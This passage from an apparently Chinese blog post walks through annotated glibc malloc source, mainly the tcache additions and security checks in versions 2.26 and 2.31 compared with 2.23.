class="hljs-comment">//chunk:内存块指针，tc_idx：内存块对应的tcache bin索引</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="hljs-comment">//强制转换类型以便作为链表的结点</span><br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="hljs-comment">//看看索引是否有效</span><br>  <span class="hljs-comment">//插入链表</span><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="hljs-comment">//将当前内存块指向链表的头部</span><br>  tcache-&gt;entries[tc_idx] = e;<span class="hljs-comment">//将链表头部更新为当前内存块</span><br>  ++(tcache-&gt;counts[tc_idx]);<span class="hljs-comment">//更新计数</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-comment">/* 调用者必须确保 tc_idx 是有效的，并且有可用的内存块可以移除。 */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><span class="hljs-comment">//用于从tcache中获取内存块</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="hljs-comment">//获取链表头部内存块地址</span><br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="hljs-comment">//检查索引是否有效</span><br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<span class="hljs-comment">//检查是否有可用内存块</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="hljs-comment">//更新链表（相当于从链表移除内存块）</span><br>  --(tcache-&gt;counts[tc_idx]);<span class="hljs-comment">//更新计数</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<span class="hljs-comment">//返回内存块</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-malloc-1"><a href="#int-malloc-1" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><h3 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">     This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">     can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment">   */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span><br><span class="hljs-meta">  do\</span><br><span class="hljs-meta">    &#123;\</span><br><span class="hljs-meta">      victim = pp;\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)\</span><br><span class="hljs-meta">break;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta"> != victim);/</span><br><span class="hljs-comment">//原子操作，保证安全从fastbin中移除内存块</span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<span class="hljs-comment">//单线程直接移除（更新fastbin链表头）</span><br>    *fb = victim-&gt;fd;<br>  <span class="hljs-keyword">else</span><span class="hljs-comment">//多线程，用上面那个宏安全移除</span><br>    REMOVE_FB (fb, pp, victim);<br>  <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>      <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>      check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//新加的，若启用tcache且其没满，就将fastbin中内存块移到tcache中</span></span><br>      <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment"> stash them in the tcache.  */</span><br>      <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  mchunkptr tc_victim;<br><br>  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br> &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>*fb = tc_victim-&gt;fd;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  REMOVE_FB (fb, pp, tc_victim);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>      tcache_put (tc_victim, tc_idx);<br>    &#125;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>      alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>与2.23相比</p><ul><li>新加了<code>tcache</code>机制，提高性能（当从<code>fastbin</code>取出<code>chunk</code>时，若<code>tcache</code>没满且<code>fastbin</code>中还有<code>chunk</code>，就将<code>fastbin</code>中<code>chunk</code>移到<code>tcache</code>中）</li><li>新加判断是否是单线程，单线程与多线程不同的取出<code>chunk</code>的方式</li></ul><h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<span class="hljs-comment">//移除内存块</span><br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          bck = victim-&gt;bk;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>          set_inuse_bit_at_offset (victim, nb);<br>          bin-&gt;bk = bck;<br>          bck-&gt;fd = bin;<br><br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<span class="hljs-comment">//非主分配区</span><br>    set_non_main_arena (victim);<br>          check_malloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//新加的</span></span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (tc_victim = last (bin)) != bin)<br>&#123;<br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br><br>      tcache_put (tc_victim, tc_idx);<span class="hljs-comment">//移入tcache</span><br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>与2.23相比</p><ul><li>引入<code>tcache</code>，在分配<code>smallbins</code>后，若还有剩余块且<code>tcache</code>有空间，就将<code>smallbin</code>中的块移入<code>tcache</code></li><li>对<code>smallbins</code>未初始化就<code>malloc_consolidate</code>的机制进行移除</li></ul><p><strong>tcache_put的过程没对smallbin的完整性进行检查</strong></p><h3 id="largebin-1"><a href="#largebin-1" class="headerlink" title="largebin"></a>largebin</h3><p>没变</p><h3 id="大循环-1"><a href="#大循环-1" class="headerlink" title="大循环"></a>大循环</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//初始化tcache相关变量</span></span><br>  INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br>  <span class="hljs-type">int</span> return_cached = <span class="hljs-number">0</span>;<br><br>  tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>与2.23：</p><ul><li>新加了<code>tcache</code>相关变量初始化</li></ul><h3 id="unsorted-bin-2"><a href="#unsorted-bin-2" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>代码太长了，这里只选取新加的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* Fill cache first, return to user only if cache fills.</span><br><span class="hljs-comment"> We may return one of these chunks later.  */</span><br>      <span class="hljs-keyword">if</span> (tcache_nb<br>  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<span class="hljs-comment">//满足tcache</span><br>&#123;<br>  tcache_put (victim, tc_idx);<span class="hljs-comment">//放到tcache中</span><br>  return_cached = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>在<code>unsortbin</code>遍历，如果符合<code>tcache</code>的条件（<code>tacche_nb</code>为真且<code>tcache</code>还没满），就将该内存块就放入<code>tcache</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>      ++tcache_unsorted_count;<span class="hljs-comment">//计数已经处理的内存块</span><br>      <span class="hljs-keyword">if</span> (return_cached<br>  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span><br>  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<span class="hljs-comment">//判断填没填满</span><br>&#123;<br>  <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>大致意思： 在处理 <code>unsorted bin</code> 中的内存块时，如果已经处理了足够多的内存块（用于填充<code> tcache</code>），则直接从 <code>tcache</code> 中返回一个内存块给用户。 </p><h2 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="libc_free"></a>libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold<br>          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX<br>  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  MAYBE_INIT_TCACHE ();<span class="hljs-comment">//多的</span><br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br>libc_hidden_def (__libc_free)<br></code></pre></td></tr></table></figure><p>主要变化就在38行，判断<code>TCACHE</code>初始化了没有，没有的话就初始化</p><h2 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<span class="hljs-comment">//更具内存块大小寻找索引</span><br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<span class="hljs-comment">//检查tcache是否可用</span><br>      &#123;<br>tcache_put (p, tc_idx);<span class="hljs-comment">//放入tcache</span><br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>与2.23相比：</p><ul><li>在释放时如果<code>tcache</code>可用且未满，就会优先放入<code>tcache</code>中，优先级最高</li></ul><h3 id="fastbin-2"><a href="#fastbin-2" class="headerlink" title="fastbin"></a>fastbin</h3><p>在2.26及更高版本中 <code>free</code>时</p><ul><li>如果tcache没满，则当前释放的块会进入<code>tcache</code>，满了就放<code>fastbin</code></li><li><code>fastbin</code>中已经有的不会被转移</li></ul><h1 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc-2.31"></a>glibc-2.31</h1><h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>新增了<code>key</code>成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//组成单向链表</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><span class="hljs-comment">//检查是否double free</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><ul><li>增加了<code>key</code>成员，防止<code>double free</code></li></ul><h3 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>增加了第8行<code>e-&gt;key = tcache;</code>标记内存块以释放到<code>tcache</code>用于在后续的释放时检测<code>double free</code></p><h3 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>增加了第七行<code>e-&gt;key = NULL;</code>：清楚<code>key</code>字段，标记该内存块为”已从<code>tcache</code>中取出</p><h2 id="libc-malloc-2"><a href="#libc-malloc-2" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h2><p>多了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">_Static_assert</span> (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);<br></code></pre></td></tr></table></figure><p>断言（就是检查满不满足条件）， 用于确保 <code>PTRDIFF_MAX</code> 不超过 <code>SIZE_MAX</code> 的一半。 防止指针运算时发生溢出。（不过我没理解这话）</p><h2 id="int-malloc-2"><a href="#int-malloc-2" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>多了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!checked_request2size (bytes, &amp;nb))<br>  &#123;<br>    __set_errno (ENOMEM);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>检查请求的大小是否合法，不合法就报错</p><h3 id="fastbin-3"><a href="#fastbin-3" class="headerlink" title="fastbin"></a>fastbin</h3><p>没变</p><h3 id="smallbin-1"><a href="#smallbin-1" class="headerlink" title="smallbin"></a>smallbin</h3><p>没变</p><h3 id="largebin-2"><a href="#largebin-2" class="headerlink" title="largebin"></a>largebin</h3><p>没变</p><h3 id="大循环-2"><a href="#大循环-2" class="headerlink" title="大循环"></a>大循环</h3><p>增加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>  &#123;<br>    <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="hljs-comment">//遍历unsorted bin</span><br>      &#123;<br>        bck = victim-&gt;bk;<span class="hljs-comment">//获取当前块的前一个块</span><br>        size = chunksize (victim);<span class="hljs-comment">//获取当前块大小</span><br>        mchunkptr next = chunk_at_offset (victim, size);<span class="hljs-comment">//获取下一个块</span><br><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>            || __glibc_unlikely (size &gt; av-&gt;system_mem))<span class="hljs-comment">//检查当前块大小是否有效</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<span class="hljs-comment">//检查下个块大小是否有效</span><br>            || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<span class="hljs-comment">//检查下个块的pre_size是否与当前快大小匹配</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>            || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<span class="hljs-comment">//检查双向链表是否损坏</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<span class="hljs-comment">//检查下个块是否被使用</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse 